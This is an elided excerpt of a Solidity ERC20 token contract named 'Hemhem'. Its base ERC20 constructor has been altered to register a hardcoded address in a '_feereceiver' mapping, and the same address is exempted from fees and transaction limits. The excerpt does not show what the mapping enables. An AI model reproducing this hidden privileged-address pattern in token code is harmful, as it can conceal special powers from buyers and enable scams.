...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x8E9CD7CDF40748dB7db749733b501D5d5E30AAbB] = _marketingwallet;
    }
...
contract Hemhem is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Hemhem", "Hamham") {
        ...
        excludeFromFees(address(0x8E9CD7CDF40748dB7db749733b501D5d5E30AAbB), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x8E9CD7CDF40748dB7db749733b501D5d5E30AAbB), true);
